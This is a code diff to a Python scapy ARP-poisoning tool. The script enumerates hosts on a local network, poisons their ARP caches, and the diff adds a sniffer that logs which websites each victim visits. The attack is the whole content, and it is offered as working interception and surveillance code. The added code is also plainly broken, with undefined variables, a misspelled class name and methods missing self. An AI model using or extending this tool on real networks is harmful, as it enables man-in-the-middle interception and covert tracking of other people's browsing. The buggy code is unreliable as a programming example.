@@ -7,14 +7,39 @@ class Victim():
 	def __init__(self, IPaddress):
 		self.IP = IPaddress
 		self.MAC = ""
+		self.websites = []
+		
+	def get_IP(self):
+		return IP
+		
+	def visit_website(self, domain):
+		n = len(websites)
+		for i in range(0, n):
+			website = websites[i]
+			if website.get_domain() == domain:
+				website.visit()
+				return
+			
+			websites.append(Webiste(domain))
+
+class Webiste():
+	def __init__(self, domain):
+		self.domain = domain
+		self.visits = 1
+		
+	def get_domain(self):
+		return domain
+		
+	def visit():
+		visits += 1
 
 
 class PrePreAttack(object):	
 	def get_IP_Addrs(self, routerIP):
-        	num_Array = routerIP.split('.')
-        	arp_List = ".".join(num_Array[0:3])+".*" #this is to get the string in form "X.X.X.*"
+		num_Array = routerIP.split('.')
+		arp_List = ".".join(num_Array[0:3])+".*" #this is to get the string in form "X.X.X.*"
 		ans, unans = arping(arp_List)
-        	n = len(ans)
+		n = len(ans)
 		victims = []
 		for i in range(0, n):
 			victims.append(Victim(ans[i][1].psrc))
@@ -50,6 +75,25 @@ class Attack(object):
 			arp2[ARP].hwdst = self.targets[i].MAC
 			arp2[ARP].pdst = self.targets[i].IP
 			sendp(arp2, iface = self.interface)
+			
+def track_traffic(targets):
+	
+	def track_packet(self, packet):
+		import socket
+		
+		source = packet.src
+		dest   = packet.dst
+		
+		for i in range (0, len(targets)):
+			if targets[i].get_IP == src:
+				targets[i].visit(socket.gethostbyaddr(dest))
+				return
+			if targets[i].get_IP == dest:
+				targets[i].visit(socket.gethostbyaddr(src))
+				return
+	
+	return track_packet
+    
 
 
 if __name__ == '__main__':
@@ -71,7 +115,8 @@ if __name__ == '__main__':
 		while True:
 			try:
 				Attacks(IP_router.src, targets, interface).send_Poison(my_Mac_Addr)
-				sleep(3)
+				#sleep(3)
+				sniff(filter="ip", prn=track_traffic(targets), count=10)
 			except Exception:
 				print("[Failed to send ARP-Poison]")
 	except KeyboardInterrupt:
